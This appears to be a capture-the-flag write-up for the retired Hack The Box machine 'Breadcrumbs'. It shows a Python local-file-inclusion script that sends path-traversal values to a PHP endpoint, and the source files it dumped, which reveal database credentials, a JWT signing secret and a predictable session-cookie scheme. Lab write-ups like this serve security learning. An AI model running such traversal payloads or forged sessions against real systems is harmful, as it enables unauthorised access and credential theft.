# Writing a python script to get source code of php files
This is a python script to get source code of php files.
```pythpn
import requests
import sys

if len(sys.argv) !=2:
    print("Usage:python3 lfi.py [path]")
    sys.exit()

url = 'http://10.10.10.228/includes/bookController.php'
cookies = {'PHPSESSID':'clarkey5ff7596fb91193d14067d301ce3595ce', 'token':'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoiY2xhcmtleSJ9fQ.nTfWSoOyE4ClICCHZ5pBZQlE9XDoO2GRfmASDszmRe0'}
data = {'book':sys.argv[1],'method':'1'}

r = requests.post(url, data=data,cookies=cookies)
print(bytes(r.text,"utf-8").decode('unicode_escape').strip('"'))
```
Like this we can get php code of /db/db.php, which sql database credentials.
```bash
~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯ python3 lfi.py book5.html/../../db/db.php
```
```php
<?php

$host="localhost";
$port=3306;
$user="bread";
$password="jUli901";
$dbname="bread";

$con = new mysqli($host, $user, $password, $dbname, $port) or die ('Could not connect to the database server' . mysqli_connect_error());
?>
```
Also of /portal/login.php which is login page. 
```bash
~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯ python3 lfi.py book5.html/../../portal/login.php
```
```php
<?php
require_once 'authController.php';
?>
<html lang="en">
    <head>
        <title>Binary<\/title>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https:\/\/maxcdn.bootstrapcdn.com\/bootstrap\/4.0.0\/css\/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW\/dAiS6JXm" crossorigin="anonymous">
        <script src="https:\/\/ajax.googleapis.com\/ajax\/libs\/jquery\/3.2.1\/jquery.min.js"><\/script>
        <link rel="stylesheet" type="text\/css" href="assets\/css\/main.css">
        <link rel="stylesheet" type="text\/css" href="assets\/css\/all.css">
    <\/head>
<body class="bg-dark text-white">
    <div class="container-fluid mt-5">
        <div class="row justify-content-center">
            <div class="col-md-4 form-div">
                <div class="alert alert-danger">
                    <p class="text-dark">Restricted domain for: <span class='text-danger'><?=$IP?><\/span><br> Please return <a href="..\/">home<\/a> or contact <a href="php\/admins.php">helper<\/a> if you think there is a mistake.<\/p>
                <\/div>
                <h3 class="text-center">Login <i class="fas fa-lock"><\/i><\/h3>
                <form action="login.php" method="post">
                    <?php if(count($errors)>0):?>
                    <div class="alert alert-danger">
                        <?php foreach($errors as $error): ?>
                        <li><?php echo $error; ?><\/li>
                        <?php endforeach?>
                    <\/div>
                    <?php endif?>

                    <div class="form-group">
                        <label for="username">Username<\/label>
                        <input type="text" name="username" class="form-control form-control-lg">
                    <\/div>

                    <div class="form-group">
                        <label for="password">Password<\/label>
                        <input type="password" name="password" class="form-control form-control-lg">
                    <\/div>

                    <input value="0" name="method" style="display:none;">

                    <div class="form-group">
                        <button type="submit" class="btn btn-primary btn-block btn-lg">Login<\/button>
                    <\/div>

                    <p class="text-center">Dont have an account? <a href="signup.php">Sign up<\/a><\/p>
                <\/form>
            <\/div>
        <\/div>
    <\/div>
    <?php include 'includes\/footer.php' ?>
<\/body>
<\/html>
```
Also of /portal/authcontroller.php which contains secret for JWT token
```bash
~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯ python3 lfi.py book5.html/../../portal/authcontroller.php
```
```php
<?php
require 'db\/db.php';
require "cookie.php";
require "vendor\/autoload.php";
use \Firebase\JWT\JWT;

$errors = array();
$username = "";
$userdata = array();
$valid = false;
$IP = $_SERVER['REMOTE_ADDR'];

\/\/if user clicks on login
if($_SERVER['REQUEST_METHOD'] === "POST"){
    if($_POST['method'] == 0){
        $username = $_POST['username'];
        $password = $_POST['password'];

        $query = "SELECT username,position FROM users WHERE username=? LIMIT 1";
        $stmt = $con->prepare($query);
        $stmt->bind_param('s', $username);
        $stmt->execute();
        $result = $stmt->get_result();
        while ($row = $result->fetch_array(MYSQLI_ASSOC)){
            array_push($userdata, $row);
        }
        $userCount = $result->num_rows;
        $stmt->close();

        if($userCount > 0){
            $password = sha1($password);
            $passwordQuery = "SELECT * FROM users WHERE password=? AND username=? LIMIT 1";
            $stmt = $con->prepare($passwordQuery);
            $stmt->bind_param('ss', $password, $username);
            $stmt->execute();
            $result = $stmt->get_result();

            if($result->num_rows > 0){
                $valid = true;
            }
            $stmt->close();
        }

        if($valid){
            session_id(makesession($username));
            session_start();

            $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
            $data = array();

            $payload = array(
                "data" => array(
                    "username" => $username
            ));

            $jwt = JWT::encode($payload, $secret_key, 'HS256');

            setcookie("token", $jwt, time() + (86400 * 30), "\/");

            $_SESSION['username'] = $username;
            $_SESSION['loggedIn'] = true;
            if($userdata[0]['position'] == ""){
                $_SESSION['role'] = "Awaiting approval";
            }
            else{
                $_SESSION['role'] = $userdata[0]['position'];
            }

            header("Location: \/portal");
        }

        else{
            $_SESSION['loggedIn'] = false;
            $errors['valid'] = "Username or Password incorrect";
        }
    }

    elseif($_POST['method'] == 1){
        $username=$_POST['username'];
        $password=$_POST['password'];
        $passwordConf=$_POST['passwordConf'];

        if(empty($username)){
            $errors['username'] = "Username Required";
        }
        if(strlen($username) < 4){
            $errors['username'] = "Username must be at least 4 characters long";
        }
        if(empty($password)){
            $errors['password'] = "Password Required";
        }
        if($password !== $passwordConf){
            $errors['passwordConf'] = "Passwords don't match!";
        }

        $userQuery = "SELECT * FROM users WHERE username=? LIMIT 1";
        $stmt = $con->prepare($userQuery);
        $stmt ->bind_param('s',$username);
        $stmt->execute();
        $result = $stmt->get_result();
        $userCount = $result->num_rows;
        $stmt->close();

        if($userCount > 0){
            $errors['username'] = "Username already exists";
        }

        if(count($errors) === 0){
            $password = sha1($password);
            $sql = "INSERT INTO users(username, password, age, position) VALUES (?,?, 0, '')";
            $stmt = $con->prepare($sql);
            $stmt ->bind_param('ss', $username, $password);

            if ($stmt->execute()){
                $user_id = $con->insert_id;
                header('Location: login.php');
            }
            else{
                $_SESSION['loggedIn'] = false;
                $errors['db_error']="Database error: failed to register";
            }
        }
    }
}
```
Also of /portal/cookie.php which method for generating cookie.
```bash
~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯ python3 lfi.py book5.html/../../portal/cookie.php
```
```php
<?php
\/**
 * @param string $username  Username requesting session cookie
 *
 * @return string $session_cookie Returns the generated cookie
 *
 * @devteam
 * Please DO NOT use default PHPSESSID; our security team says they are predictable.
 * CHANGE SECOND PART OF MD5 KEY EVERY WEEK
 * *\/
function makesession($username){
    $max = strlen($username) - 1;
    $seed = rand(0, $max);
    $key = "s4lTy_stR1nG_".$username[$seed]."(!528.\/9890";
    $session_cookie = $username.md5($key);

    return $session_cookie;
}
```
Also of /portal/php/files.php/portal/php/files.php/portal/php/files.php which tells that username should be `paul` (who is admin)to upload files   
```bash
~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯ python3 lfi.py book5.html/../../portal/php/files.php
```
```php
<?php session_start();
$LOGGED_IN = false;
if($_SESSION['username'] !== "paul"){
    header("Location: ..\/index.php");
}
if(isset($_SESSION['loggedIn'])){
    $LOGGED_IN = true;
    require '..\/db\/db.php';
}
else{
    header("Location: ..\/auth\/login.php");
    die();
}
?>
<html lang="en">
    <head>
        <title>Binary<\/title>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https:\/\/maxcdn.bootstrapcdn.com\/bootstrap\/4.0.0\/css\/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW\/dAiS6JXm" crossorigin="anonymous">
        <script src="https:\/\/ajax.googleapis.com\/ajax\/libs\/jquery\/3.2.1\/jquery.min.js"><\/script>
        <link rel="stylesheet" type="text\/css" href="..\/assets\/css\/main.css">
        <link rel="stylesheet" type="text\/css" href="..\/assets\/css\/all.css">
    <\/head>

    <nav class="navbar navbar-default justify-content-end">
        <div class="navbar-header justify-content-end">
            <button type="button" class="navbar-toggle btn btn-outline-info p-3 m-3" data-toggle="collapse" data-target=".navbar-collapse"><i class="fas fa-hamburger"><\/i><\/button>
        <\/div>

        <div class="collapse navbar-collapse justify-content-end mr-5">
             <ul class="navbar-nav">
                <li class="nav-item"><a class="nav-link text-right" href="..\/index.php"><i class="fas fa-home"><\/i> Home<\/a><\/li>
                <li class="nav-item"><a class="nav-link text-right" href="issues.php"><i class="fa fa-check" aria-hidden="true"><\/i> Issues<\/a><\/li>
                <li class="nav-item"><a class="nav-link text-right" href="users.php"><i class="fa fa-user" aria-hidden="true"><\/i> User Management<\/a><\/li>
                <li class="nav-item"><a class="nav-link text-right" href="#"><i class="fa fa-file" aria-hidden="true"><\/i> File Management<\/a><\/li>
                <li class="nav-item"><a class="nav-link text-right" href="..\/auth\/logout.php"><i class="fas fa-sign-out-alt"><\/i> Logout<\/a><\/li>
             <\/ul>
        <\/div>
    <\/nav>
    <body class="bg-dark">
        <main class="main">
            <div class="row justify-content-center text-white text-center">
                <div class="col-md-3">
                    <h1>Task Submission<\/h1>
                    <p class="text-danger"><i class="fas fa-exclamation-circle"><\/i> Please upload only .zip files!<\/p>
                    <form onsubmit="return false">
                        <div class="form-group mt-5">
                            <input type="text" class="form-control" placeholder="Task completed" id="task" name="task">
                        <\/div>
                        <div class="form-group">
                            <input type="file" class="form-control" placeholder="Task" id="file" name="file">
                        <\/div>
                        <button type="submit" class="btn btn-outline-success btn-block py-3" id="upload">Upload<\/button>
                    <\/form>
                    <p id="message"><\/p>
                <\/div>
            <\/div>
        <\/div>
        <\/main>

        <?php include "..\/includes\/footer.php"; ?>
        <script src="https:\/\/cdn.jsdelivr.net\/npm\/bootstrap@4.5.3\/dist\/js\/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ\/JpcUGGOn+Y7RsweNrtN\/tE3MoK7ZeZDyx" crossorigin="anonymous"><\/script>
        <script type="text\/javascript" src='..\/assets\/js\/files.js'><\/script>
    <\/body>


<\/html>
```
Also portal/includes/filecontroller.php which tells that we need paul as admin to upload files
```bash
❯ python3 lfi.py book5.html/../../portal/includes/filecontroller.php
```
```php
<?php
$ret = "";
require "..\/vendor\/autoload.php";
use \Firebase\JWT\JWT;
session_start();

function validate(){
    $ret = false;
    $jwt = $_COOKIE['token'];

    $secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e';
    $ret = JWT::decode($jwt, $secret_key, array('HS256'));
    return $ret;
}

if($_SERVER['REQUEST_METHOD'] === "POST"){
    $admins = array("paul");
    $user = validate()->data->username;
    if(in_array($user, $admins) && $_SESSION['username'] == "paul"){
        error_reporting(E_ALL & ~E_NOTICE);
        $uploads_dir = '..\/uploads';
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_POST['task'];

        if(move_uploaded_file($tmp_name, "$uploads_dir\/$name")){
            $ret = "Success. Have a great weekend!";
        }
        else{
            $ret = "Missing file or title :(" ;
        }
    }
    else{
        $ret = "Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.";
    }

    echo $ret;
}
```
